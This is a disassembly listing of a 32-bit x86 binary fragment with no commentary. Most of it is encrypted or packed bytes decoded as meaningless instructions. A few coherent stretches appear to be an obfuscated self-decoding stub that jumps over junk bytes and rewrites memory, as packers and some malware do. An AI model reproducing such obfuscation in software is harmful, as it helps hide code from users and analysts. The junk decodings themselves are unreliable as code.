  402938:	sbb    DWORD PTR [esp+ebx*2],ebp
  40293b:	xor    ecx,DWORD PTR [ebx+0x46]
  40293e:	dec    esi
  40293f:	sub    edi,DWORD PTR [ebp-0x5c8eef6a]
  402945:	nop
  402946:	mov    ah,BYTE PTR [ebx+0x4e84c11b]
  40294c:	test   al,0xa
  40294e:	imul   eax,DWORD PTR [ebp-0x2b],0x7639c8c4
  402955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402956:	popf   
  402957:	dec    eax
  402958:	icebp  
  402959:	fild   DWORD PTR [ecx]
  40295b:	scas   eax,DWORD PTR es:[edi]
  40295c:	push   ebp
  40295d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40295e:	ss jmp 0x362525a5
  402964:	ins    BYTE PTR es:[edi],dx
  402965:	lods   al,BYTE PTR ds:[esi]
  402966:	dec    edi
  402967:	fcom   QWORD PTR [ebp-0x51]
  40296a:	rol    esp,0x62
  40296d:	lods   al,BYTE PTR ds:[esi]
  40296e:	rcl    DWORD PTR [ebp-0x632d3a38],0xdc
  402975:	xor    ebp,edi
  402977:	fisubr DWORD PTR [esi+0x6f9c74a5]
  40297d:	mov    ds:0xb7bde097,eax
  402982:	in     al,dx
  402983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402984:	lahf   
  402985:	fs jo  0x4029eb
  402988:	mov    ebx,0xd305980f
  40298d:	cmp    dl,cl
  40298f:	test   al,0x70
  402991:	or     bh,BYTE PTR [ebx]
  402993:	push   0x325c13fe
  402998:	or     bl,BYTE PTR [edx+0xf]
  40299b:	out    0xc3,al
  40299d:	dec    esi
  40299e:	arpl   cx,sp
  4029a0:	inc    ebx
  4029a1:	hlt    
  4029a2:	sbb    dh,bl
  4029a4:	inc    DWORD PTR [eax+ebx*8]
  4029a7:	pop    esi
  4029a8:	rcl    cl,1
  4029aa:	and    al,0x2d
  4029ac:	mov    esp,DWORD PTR [eax-0x8]
  4029af:	outs   dx,DWORD PTR ds:[esi]
  4029b0:	jae    0x4029ac
  4029b2:	sti    
  4029b3:	dec    ecx
  4029b4:	inc    ebx
  4029b5:	popa   
  4029b6:	out    0x36,eax
  4029b8:	stos   BYTE PTR es:[edi],al
  4029b9:	mov    ecx,esp
  4029bb:	mov    edx,0x4bd9b32c
  4029c0:	rol    BYTE PTR [ecx],0x80
  4029c3:	mov    edx,0xe84db71a
  4029c8:	add    esp,DWORD PTR [eax]
  4029ca:	jb     0x402953
  4029cc:	cs popf 
  4029ce:	adc    eax,0x313bfb3e
  4029d3:	push   eax
  4029d4:	sbb    eax,0xbf63219
  4029d9:	pop    ebp
  4029da:	push   es
  4029db:	sti    
  4029dc:	es xchg esi,eax
  4029de:	xor    ebx,esp
  4029e0:	xchg   esi,eax
  4029e1:	out    dx,eax
  4029e2:	out    0x0,eax
  4029e4:	jge    0x4029ab
  4029e6:	xor    eax,DWORD PTR [edi+0x1b0c9346]
  4029ec:	push   eax
  4029ed:	sbb    bl,BYTE PTR [ecx-0x58]
  4029f0:	pop    es
  4029f1:	(bad)  
  4029f3:	neg    DWORD PTR [edi+0xe961eaf]
  4029f9:	sbb    eax,0x8ab087fc
  4029fe:	jp     0x402a25
  402a00:	dec    eax
  402a01:	push   ebp
  402a02:	outs   dx,DWORD PTR ds:[esi]
  402a03:	jp     0x4029e8
  402a05:	xchg   DWORD PTR [ebp+0x73],edx
  402a08:	outs   dx,DWORD PTR ds:[esi]
  402a09:	mov    ah,dl
  402a0b:	mov    al,0xd3
  402a0d:	jp     0x402a03
  402a0f:	fadd   QWORD PTR [edi+0x458bc297]
  402a15:	aam    0xf
  402a17:	test   DWORD PTR [ebx],eax
  402a19:	add    BYTE PTR [eax],al
  402a1b:	add    BYTE PTR [ebx-0x39cc0fbb],cl
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	repnz mov ch,0xec
  402a37:	sahf   
  402a38:	stos   BYTE PTR es:[edi],al
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a41:	(bad)  
  402a42:	fcmovne st,st(7)
  402a44:	sar    BYTE PTR [ecx-0x36b063b7],cl
  402a4a:	(bad)  
  402a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a4d:	stos   BYTE PTR es:[edi],al
  402a4e:	fcomp  QWORD PTR [ecx+0x713c607a]
  402a54:	mov    al,0x40
  402a56:	lods   al,BYTE PTR ds:[esi]
  402a57:	popf   
  402a58:	ins    DWORD PTR es:[edi],dx
  402a59:	inc    edx
  402a5a:	adc    BYTE PTR ds:0x660d9e59,al
  402a60:	pop    esi
  402a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a62:	pop    esp
  402a63:	xchg   esp,eax
  402a64:	xor    cl,BYTE PTR [ebp-0x41b91b2a]
  402a6a:	dec    ebx
  402a6b:	cs popa 
  402a6d:	arpl   WORD PTR [edi+0xdfbc09b],di
  402a73:	xor    BYTE PTR [ebx+ebp*2+0x21],al
  402a77:	cwde   
  402a78:	pop    eax
  402a79:	sub    dh,BYTE PTR [eax+eax*8]
  402a7c:	dec    edi
  402a7d:	pushf  
  402a7e:	or     ebp,DWORD PTR ds:0xe9f898c1
  402a84:	mov    cl,0xac
  402a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a87:	mov    esi,0x1d0f8519
  402a8c:	jnp    0x402a62
  402a8e:	pop    esp
  402a8f:	pop    DWORD PTR [esi]
  402a91:	int    0xbf
  402a93:	mov    al,ds:0xfa16dab6
  402a98:	dec    BYTE PTR [eax+ebp*4-0x5]
  402a9c:	adc    BYTE PTR cs:[ebp+0x44],bh
  402aa0:	mov    dh,0x1
  402aa2:	jle    0x402aaf
  402aa4:	dec    esp
  402aa5:	retf   
  402aa6:	mov    edx,0xe682798
  402aab:	call   0xb8d0:0x6961e54
  402ab2:	js     0x402ac5
  402ab4:	stos   BYTE PTR es:[edi],al
  402ab5:	jg     0x402a42
  402ab7:	mov    esi,0x2c6a6ebe
  402abc:	(bad)  
  402abd:	daa    
  402abe:	xchg   ebx,eax
  402abf:	ins    BYTE PTR es:[edi],dx
  402ac0:	xor    BYTE PTR ds:0xef52728f,0xdd
  402ac7:	mov    dl,0xf0
  402ac9:	inc    edi
  402aca:	pop    ebx
  402acb:	xor    al,0xfe
  402acd:	mov    edi,0x3b577dcd
  402ad2:	sbb    edx,ebx
  402ad4:	mov    eax,ds:0x65209fd9
  402ad9:	ja     0x402b3f
  402adb:	or     ah,BYTE PTR [eax+eax*8-0x316a4af5]
  402ae2:	ret    
  402ae3:	cmp    DWORD PTR [edi+0x20],ebx
  402ae6:	clc    
  402ae7:	xor    bh,BYTE PTR [edi+0x3981271e]
  402aed:	call   0xa7e29627
  402af2:	cwde   
  402af3:	mov    edx,0x42702d61
  402af8:	jmp    0x402a9e
  402afa:	popf   
  402afb:	jle    0x402b58
  402afd:	sub    eax,0x655e5473
  402b02:	xor    DWORD PTR fs:[ebp+ebp*2-0x50],ecx
  402b07:	pop    ecx
  402b08:	mov    ah,BYTE PTR [esi-0x1fc99888]
  402b0e:	out    0x8,eax
  402b10:	test   DWORD PTR [edx-0x3f],ebx
  402b13:	ins    DWORD PTR es:[edi],dx
  402b14:	popf   
  402b15:	sbb    ax,0xa07d
  402b19:	inc    ecx
  402b1a:	lds    edx,FWORD PTR [edi+0x50]
  402b1d:	xchg   esi,eax
  402b1e:	cmc    
  402b1f:	loope  0x402af6
  402b21:	xor    DWORD PTR [edi+0x4c],edi
  402b24:	sub    DWORD PTR [ebp+0x5d],ebp
  402b27:	push   0xffffffeb
  402b29:	nop
  402b2a:	jmp    0x2ed0:0xfc4f5642
  402b31:	mov    ah,0xbc
  402b33:	and    BYTE PTR [edx+0x8a8e34e],dl
  402b39:	xchg   ecx,eax
  402b3a:	or     DWORD PTR [ecx-0x53c60dab],edx
  402b40:	rol    bh,0xd4
  402b43:	vpmuludq xmm1,xmm3,xmm7
  402b47:	and    edi,DWORD PTR [ecx]
  402b49:	push   ecx
  402b4a:	test   al,0x8e
  402b4c:	cli    
  402b4d:	addr16 popa 
  402b4f:	out    0xb1,al
  402b51:	adc    esi,DWORD PTR [ecx+0x141dedb8]
  402b57:	into   
  402b58:	popa   
  402b59:	mov    ch,0x5
  402b5b:	psrlw  mm3,QWORD PTR [edx+0x22]
  402b5f:	sbb    DWORD PTR [ecx+0x7f44b028],edx
  402b65:	jmp    0xd30c:0x494251d4
  402b6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b6d:	or     BYTE PTR [ecx+0x58efbdf],bh
  402b73:	ins    DWORD PTR es:[edi],dx
  402b74:	sub    al,0xd9
  402b76:	cld    
  402b77:	adc    DWORD PTR [eax+0x12],edx
  402b7a:	fild   QWORD PTR [eax-0x32402d3a]
  402b80:	jg     0x402b2e
  402b82:	xor    eax,0x138adc80
  402b87:	data16 (bad) 
  402b8a:	std    
  402b8b:	pop    ss
  402b8c:	jg     0x402bb2
  402b8e:	push   0xffffffa1
  402b90:	jne    0x402bbd
  402b92:	fadd   st,st(0)
  402b94:	jge    0x402b66
  402b96:	sahf   
  402b97:	jmp    0x741c:0xbcd0350e
  402b9e:	sub    esi,DWORD PTR [edx-0x190f54a6]
  402ba4:	out    0x94,al
  402ba6:	fwait
  402ba7:	sub    BYTE PTR [edx],cl
  402ba9:	ja     0x402c18
  402bab:	mov    bh,0x2c
  402bad:	lods   al,BYTE PTR ds:[esi]
  402bae:	jmp    0x402bf5
  402bb0:	inc    ebp
  402bb1:	aam    0x59
  402bb3:	and    al,0x67
  402bb5:	mov    ebx,0x95ee7d60
  402bba:	jns    0x402b48
  402bbc:	call   0x3215:0x5a722357
  402bc3:	or     DWORD PTR [ebp+0x28840fc0],eax
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	add    BYTE PTR [ebp-0x977b],cl
  402bd1:	call   DWORD PTR [eax-0x75]
  402bd4:	inc    ebp
  402bd5:	in     al,0x33
  402bd7:	mov    BYTE PTR [ebx],0xc7
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	sbb    eax,0x3667e123
  402c16:	or     edi,DWORD PTR [esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c1e
  402c1e:	ss int3 
  402c20:	jnp    0x402bf0
  402c22:	and    al,0x4f
  402c24:	retf   
  402c25:	int    0x6
  402c27:	addr16 pop esp
  402c29:	or     BYTE PTR [eax+0x6a],0x2d
  402c2d:	jl     0x402bd7
  402c2f:	daa    
  402c30:	jb     0x402be7
  402c32:	retf   
  402c33:	lock xor edx,ecx
  402c36:	push   0x36
  402c38:	call   0x9b59:0x2897bae4
  402c3f:	add    al,0x2d
  402c41:	out    0xcc,al
  402c43:	add    bh,BYTE PTR [ecx]
  402c45:	(bad)  
  402c46:	fcom   QWORD PTR [ebx]
  402c48:	push   edi
  402c49:	bound  ebp,QWORD PTR [esi+0x112d35f5]
  402c4f:	xor    dl,BYTE PTR [ecx+0x3b374255]
  402c55:	in     eax,dx
  402c56:	pop    ebp
  402c57:	test   eax,0x7a5da6dc
  402c5c:	das    
  402c5d:	test   DWORD PTR [eax+0x4e],ebp
  402c60:	cdq    
  402c61:	cmp    ecx,DWORD PTR [edx+0x12]
  402c64:	xor    BYTE PTR [ecx],ch
  402c66:	popf   
  402c67:	enter  0x60a9,0x25
  402c6b:	bound  edi,QWORD PTR [edx+0x27]
  402c6e:	cli    
  402c6f:	xor    eax,0x65ebc85a
  402c74:	fnstcw WORD PTR [ecx-0x2]
  402c77:	iret   
  402c78:	inc    ebx
  402c79:	jbe    0x402c2d
  402c7b:	or     eax,0x54bc5fc3
  402c80:	std    
  402c81:	add    DWORD PTR [ebp+0x6f],edi
  402c84:	test   BYTE PTR ds:0x33d22ab0,dh
  402c8a:	xor    ecx,DWORD PTR [edx]
  402c8c:	or     BYTE PTR [edi-0x32],dh
  402c8f:	ror    DWORD PTR [ecx],0x9
  402c92:	retf   0xff09
  402c95:	fcom   DWORD PTR [edx+ebp*1-0xb]
  402c99:	jle    0x402c3f
  402c9b:	pop    edx
  402c9c:	xchg   esp,eax
  402c9d:	push   ds
  402c9e:	pop    edx
  402c9f:	mov    al,0x90
  402ca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ca2:	dec    edx
  402ca3:	scas   al,BYTE PTR es:[edi]
  402ca4:	jbe    0x402c79
  402ca6:	enter  0x788b,0xaa
  402caa:	nop
  402cab:	outs   dx,BYTE PTR ds:[esi]
  402cac:	adc    dh,al
  402cae:	push   eax
  402caf:	or     eax,0x6bddcde5
  402cb4:	mov    ebx,0xb1bb5a1e
  402cb9:	ud2    
  402cbb:	and    al,0xa2
  402cbd:	and    al,0x4
  402cbf:	adc    eax,0x642e96c2
  402cc4:	inc    edi
  402cc5:	pop    ebx
  402cc6:	in     eax,0xa5
  402cc8:	push   bx
  402cca:	in     eax,0x65
  402ccc:	shl    BYTE PTR [ecx+ecx*1-0x2e],0x14
  402cd1:	mov    eax,ebp
  402cd3:	mov    esi,0xa19854c4
  402cd8:	pop    edi
  402cd9:	jge    0x402c99
  402cdb:	cmp    eax,DWORD PTR [eax-0x6b8d9b05]
  402ce1:	dec    ebx
  402ce2:	xor    esi,DWORD PTR [edi+edx*8]
  402ce5:	dec    edi
  402ce6:	mov    esi,0x2014b427
  402ceb:	iret   
  402cec:	sbb    ah,BYTE PTR [ecx]
  402cee:	jne    0x402ce5
  402cf0:	mov    bl,0x96
  402cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cf3:	mov    ah,0x65
  402cf5:	js     0x402d15
  402cf7:	add    edi,DWORD PTR [edi-0x1a957945]
  402cfd:	test   esp,ebx
  402cff:	adc    DWORD PTR [edi],ebp
  402d01:	pusha  
  402d02:	jno    0x402cac
  402d04:	ret    
  402d05:	and    ebp,DWORD PTR [esi]
  402d07:	push   ds
  402d08:	adc    BYTE PTR [ecx-0x5e],bl
  402d0b:	std    
  402d0c:	dec    esi
  402d0d:	fmul   QWORD PTR [ebx+0x2f495c43]
  402d13:	aam    0x1c
  402d15:	mov    ds:0x92967025,al
  402d1a:	retf   0x67cb
  402d1d:	and    ebp,DWORD PTR [edx-0x22]
  402d20:	mov    WORD PTR [edi+0x2cc346bd],?
  402d26:	dec    eax
  402d27:	scas   al,BYTE PTR es:[edi]
  402d28:	daa    
  402d29:	fdiv   DWORD PTR [ebx+0x49ad51f1]
  402d2f:	(bad)  
  402d30:	xchg   ebx,eax
  402d31:	add    al,0x5b
  402d33:	add    eax,0xae241b02
  402d38:	adc    BYTE PTR [ebx],bl
  402d3a:	imul   ecx,ebp,0x25
  402d3d:	pop    ds
  402d3e:	es call 0xa073:0xeb738769
  402d46:	je     0x402d94
  402d48:	(bad)
  402d4b:	xlat   BYTE PTR ds:[ebx]
  402d4c:	stos   BYTE PTR es:[edi],al
  402d4d:	jnp    0x402d7e
  402d4f:	and    ah,BYTE PTR [esi-0x16]
  402d52:	xor    eax,0x4edf6bec
  402d57:	mov    eax,0x4cc0d1c7
  402d5c:	and    al,0x78
  402d5e:	push   ds
  402d5f:	xor    esi,esp
  402d61:	in     eax,0xa0
  402d63:	sbb    BYTE PTR [ecx-0x687d35fb],0x89
  402d6a:	cmp    bh,bl
  402d6c:	xchg   ebp,eax
  402d6d:	fcmovnbe st,st(6)
  402d6f:	cmp    al,0x10
  402d71:	push   edx
  402d72:	dec    esi
  402d73:	pop    ebx
  402d74:	inc    ecx
  402d75:	aad    0x7c
  402d77:	iret   
  402d78:	inc    edi
  402d79:	(bad)  
  402d7a:	or     DWORD PTR [edi+0x59849a2a],ecx
  402d80:	lods   al,BYTE PTR ds:[esi]
  402d81:	dec    ebp
  402d82:	pop    edx
  402d83:	and    al,0x25
  402d85:	dec    edi
  402d86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d87:	cli    
  402d88:	xchg   ebp,eax
  402d89:	inc    esi
  402d8a:	jbe    0x402d81
  402d8c:	pop    edi
  402d8d:	sbb    ebx,esp
  402d8f:	inc    ecx
  402d90:	sub    bl,cl
  402d92:	ins    BYTE PTR es:[edi],dx
  402d93:	(bad)  
  402d94:	imul   edi,DWORD PTR ds:0x87ce7e86,0x36
  402d9b:	pop    ebx
  402d9c:	push   ebx
  402d9d:	ss inc esi
  402d9f:	jmp    ebx
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [edx+ebx*1+0x58],1
  402de7:	cmc    
  402de8:	inc    edi
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e51
  402df2:	inc    ecx
  402df3:	outs   dx,DWORD PTR ds:[esi]
  402df4:	mov    dh,0x95
  402df6:	sbb    DWORD PTR [esi],edi
  402df8:	pop    eax
  402df9:	test   DWORD PTR ds:0xa464435b,esi
  402dff:	arpl   WORD PTR fs:[edi+0x58959994],bp
  402e06:	jb     0x402dbc
  402e08:	aad    0x71
  402e0a:	cdq    
  402e0b:	xor    BYTE PTR [eax+0x1a],al
  402e0e:	dec    edi
  402e0f:	add    eax,0x8f9687dd
  402e14:	retf   0xb78d
  402e17:	(bad)  
  402e18:	mov    ds:0x39e955e5,eax
  402e1d:	iret   
  402e1e:	mov    dl,0x67
  402e20:	sbb    al,ah
  402e22:	pop    ecx
  402e23:	and    al,0xba
  402e25:	(bad)  
  402e26:	cli    
  402e27:	mov    dl,0xf8
  402e29:	aam    0x21
  402e2b:	retf   0xed16
  402e2e:	xchg   DWORD PTR [eax+0x1c69149],ebp
  402e34:	dec    edi
  402e35:	jnp    0x402e96
  402e37:	jb     0x402e1f
  402e39:	xchg   ebp,eax
  402e3a:	je     0x402e05
  402e3c:	daa    
  402e3d:	push   ds
  402e3e:	or     dh,dl
  402e40:	fwait
  402e41:	cmc    
  402e42:	test   dl,al
  402e44:	aas    
  402e45:	ja     0x402eae
  402e47:	mov    ds:0x4182796a,al
  402e4c:	je     0x402dcf
  402e4e:	mov    ecx,0x9ee86d83
  402e53:	xchg   esi,eax
  402e54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e56:	mov    DWORD PTR [ebp+0x1a],ebx
  402e59:	jbe    0x402e5f
  402e5b:	in     al,dx
  402e5c:	dec    edi
  402e5d:	pop    es
  402e5e:	mov    al,ds:0xeb154b7e
  402e63:	sti    
  402e64:	lea    eax,[esi+0x37]
  402e67:	mov    dh,0xb0
  402e69:	sbb    dl,BYTE PTR [eax+edi*2+0x7]
  402e6d:	push   edx
  402e6e:	pop    esi
  402e6f:	mov    edx,0xc868c129
  402e74:	xor    BYTE PTR [eax+ecx*4-0x32],cl
  402e78:	iret   
  402e79:	xor    al,0x91
  402e7b:	(bad)  
  402e7c:	(bad)  
  402e7d:	fdiv   DWORD PTR [ebx+esi*1-0x4594af4f]
  402e84:	outs   dx,DWORD PTR ds:[esi]
  402e85:	call   0xc94ebd43
  402e8a:	ss jae 0x402e98
  402e8d:	outs   dx,DWORD PTR ds:[esi]
  402e8e:	ins    DWORD PTR es:[edi],dx
  402e8f:	xor    DWORD PTR [ebx+0x53],esi
  402e92:	test   eax,0x8bff6bea
  402e97:	sbb    al,BYTE PTR [esi+0x2c6065f7]
  402e9d:	inc    edi
  402e9e:	repz fsubr DWORD PTR [edx]
  402ea1:	out    dx,al
  402ea2:	int3   
  402ea3:	pop    edi
  402ea4:	loop   0x402eb7
  402ea6:	in     eax,0xdd
  402ea8:	stos   BYTE PTR es:[edi],al
  402ea9:	dec    esp
  402eaa:	xor    DWORD PTR [ebx-0x1e],ebx
  402ead:	cs pop esi
  402eaf:	sti    
  402eb0:	xchg   ebp,eax
  402eb1:	mov    ds:0xcb2f5465,eax
  402eb6:	sub    edi,DWORD PTR [edx]
  402eb8:	cmp    ch,cl
  402eba:	pop    ds
  402ebb:	cdq    
  402ebc:	psubb  mm1,QWORD PTR [ebp+ecx*4-0x19]
  402ec1:	aam    0x23
  402ec3:	mov    al,ds:0x5d667d61
  402ec8:	ds cmp eax,0x6684e75c
  402ece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ecf:	xchg   esi,eax
  402ed0:	add    dh,BYTE PTR [ebp+0x49]
  402ed3:	rcl    BYTE PTR ds:0xfc8a22dc,1
  402ed9:	retf   
  402eda:	leave  
  402edb:	mov    dh,BYTE PTR [esi]
  402edd:	sar    DWORD PTR [ebp+0x7c],0xdf
  402ee1:	jecxz  0x402f36
  402ee3:	out    dx,eax
  402ee4:	pop    esi
  402ee5:	push   ds
  402ee6:	data16 icebp 
  402ee8:	xchg   DWORD PTR [ebx],ebp
  402eea:	test   DWORD PTR [ebp-0x13],ecx
  402eed:	jmp    0xabd2:0xa2a55c70
  402ef4:	out    0x44,al
  402ef6:	adc    al,BYTE PTR [edx]
  402ef8:	fdiv   QWORD PTR [edx]
  402efa:	xor    eax,0x10bf8bfa
  402eff:	fstp   TBYTE PTR [edi-0x2a]
  402f02:	cmp    al,0x6b
  402f04:	dec    edi
  402f05:	arpl   bp,ax
  402f07:	inc    ebp
  402f08:	adc    esp,DWORD PTR [edx+0x24]
  402f0b:	aam    0xc2
  402f0d:	add    BYTE PTR [edi+0x71f4276c],0xd
  402f14:	xchg   ebx,eax
  402f15:	and    ch,BYTE PTR [esi-0x4fb6e1fd]
  402f1b:	pop    ebp
  402f1c:	scas   al,BYTE PTR es:[edi]
  402f1d:	sbb    al,BYTE PTR [esi+esi*1]
  402f20:	inc    esi
  402f21:	xlat   BYTE PTR ds:[ebx]
  402f22:	or     DWORD PTR [eax-0x2c],edi
  402f25:	adc    DWORD PTR [ecx+0x1e],eax
  402f28:	out    0xb7,eax
  402f2a:	mov    ds:0xafaae2e6,eax
  402f2f:	dec    edx
  402f30:	fwait
  402f31:	shl    DWORD PTR [ecx+ebx*1+0x1f5462bd],0x9
  402f39:	sbb    al,0xab
  402f3b:	popa   
  402f3c:	pushf  
  402f3d:	dec    edi
  402f3e:	lods   al,BYTE PTR ds:[esi]
  402f3f:	das    
  402f40:	sbb    ah,BYTE PTR [edx+0x463d6966]
  402f46:	jbe    0x402f4a
  402f48:	(bad)
  402f4b:	ins    BYTE PTR es:[edi],dx
  402f4c:	cs lock or eax,0xa45fe4b1
  402f53:	and    al,0xea
  402f55:	push   cs
  402f56:	adc    cl,BYTE PTR ds:0x7af6045f
  402f5c:	mov    BYTE PTR [eax+ebp*1+0x7ae12c2d],0xc3
  402f64:	dec    ebx
  402f66:	stc    
  402f67:	sub    dl,BYTE PTR gs:[edi-0x6f]
  402f6b:	clc    
  402f6c:	push   0x8733922e
  402f71:	xor    bl,BYTE PTR [ebx-0x5b]
  402f74:	test   eax,0x3c0c058d
  402f79:	inc    ecx
  402f7a:	add    bh,bh
  402f7c:	xor    BYTE PTR [ebp+0x4139b805],cl
  402f82:	add    bh,bh
  402f84:	xor    BYTE PTR [ebp+0x413bec05],cl
  402f8a:	add    bh,bh
  402f8c:	xor    BYTE PTR [ebp+0x413d3405],cl
  402f92:	add    bh,bh
  402f94:	xor    BYTE PTR [edi+0x534343d3],al
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x5a87a5b7]
  402fae:	iret   
  402faf:	jo     0x402fef
  402fb1:	push   ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402f8a
  402fb9:	sub    dl,BYTE PTR [ebx]
  402fbb:	inc    esi
  402fbc:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  402fbe:	in     ax,dx
  402fc0:	adc    BYTE PTR [esi-0x57],0x75
  402fc4:	pop    esp
  402fc5:	scas   al,BYTE PTR es:[edi]
  402fc6:	ret    0xb277
  402fc9:	(bad)  
  402fcc:	push   ecx
  402fcd:	jmp    0x402fa0
  402fcf:	gs iret 
  402fd1:	and    BYTE PTR [edx+0x6],0x6e
  402fd5:	(bad)  
  402fd6:	jge    0x402ff0
  402fd8:	push   ds
  402fd9:	inc    esi
  402fda:	fstp   DWORD PTR [edi]
  402fdc:	fiadd  WORD PTR [edi+0x1c575fee]
  402fe2:	imul   esi,DWORD PTR [eax-0x4e],0xffffffe7
  402fe6:	mov    al,ds:0xefda18b8
  402feb:	imul   ebx,esp,0xc91bb96e
  402ff1:	outs   dx,BYTE PTR ds:[esi]
  402ff2:	sub    al,0x5f
  402ff4:	out    0x77,eax
  402ff6:	outs   dx,BYTE PTR ds:[esi]
  402ff7:	sbb    eax,0xa26c8960
  402ffc:	lods   al,BYTE PTR ds:[esi]
  402ffd:	and    esi,DWORD PTR [ebx-0x54]
  403000:	jmp    DWORD PTR [eax]
  403002:	cwde   
  403003:	push   0xffffff9e
  403005:	test   al,0xf3
  403007:	inc    eax
  403008:	mov    WORD PTR [esi-0x53],?
  40300b:	push   esi
  40300c:	and    al,BYTE PTR [edi]
  40300e:	sbb    dh,0xc5
  403011:	mov    bh,0x8
  403013:	jbe    0x402fe8
  403015:	add    edi,ebx
  403017:	inc    eax
  403018:	lock ja 0x40302b
  40301b:	jmp    0x40302b
  40301d:	call   0x8500cb1b
  403022:	xlat   BYTE PTR ds:[ebx]
  403023:	push   cs
  403024:	sub    BYTE PTR [ecx-0xd684125],bl
  40302a:	fstp   TBYTE PTR [ebx]
  40302c:	lea    edi,[esi]
  40302e:	fwait
  40302f:	mov    dh,0xfd
  403031:	pop    edi
  403032:	push   esi
  403033:	or     al,0x72
  403035:	aaa    
  403036:	mov    al,ds:0xc9c6dbaa
  40303b:	les    ebx,FWORD PTR [ecx]
  40303d:	pop    ecx
  40303e:	repz icebp 
  403040:	fcomp  DWORD PTR [eax+0x5d17b64f]
  403046:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403047:	cld    
  403048:	cmp    al,0x7f
  40304a:	popf   
  40304b:	or     al,0xf8
  40304d:	ret    
  40304e:	outs   dx,DWORD PTR ds:[esi]
  40304f:	test   al,0xb1
  403051:	(bad)  
  403052:	imul   ecx,DWORD PTR [ecx+ebx*1-0x4f],0xd0d9083f
  40305a:	or     eax,0x82bd769a
  40305f:	je     0x403002
  403061:	jle    0x403041
  403063:	dec    edx
  403064:	pop    edx
  403065:	adc    DWORD PTR [esi],ebp
  403067:	lock jo 0x403096
  40306a:	xchg   ecx,eax
  40306b:	scas   eax,DWORD PTR es:[edi]
  40306c:	jbe    0x4030d6
  40306e:	ja     0x403021
  403070:	or     bh,BYTE PTR [edi+0x5b]
  403073:	add    eax,DWORD PTR [ecx-0x78]
  403076:	mov    ecx,0xb22ced62
  40307b:	and    esi,DWORD PTR [esi-0x1f]
  40307e:	leave  
  40307f:	es mov bl,0x20
  403082:	or     bp,di
  403085:	in     eax,0x3b
  403087:	adc    bh,BYTE PTR [ebp+0x45adb6b1]
  40308d:	sbb    BYTE PTR [ecx],dh
  40308f:	push   edi
  403090:	xchg   BYTE PTR [eax+0x1f70d604],bl
  403096:	ss mov ecx,0xc0e20f87
  40309c:	mov    edx,0x22f4c944
  4030a1:	jmp    esp
  4030a3:	inc    edi
  4030a4:	hlt    
  4030a5:	inc    ebp
  4030a6:	xor    al,0x6a
  4030a8:	popa   
  4030a9:	xchg   ecx,eax
  4030aa:	dec    ebx
  4030ab:	xchg   DWORD PTR [edx],ebp
  4030ad:	cli    
  4030ae:	bound  edi,QWORD PTR [esi-0xf]
  4030b1:	int    0x0
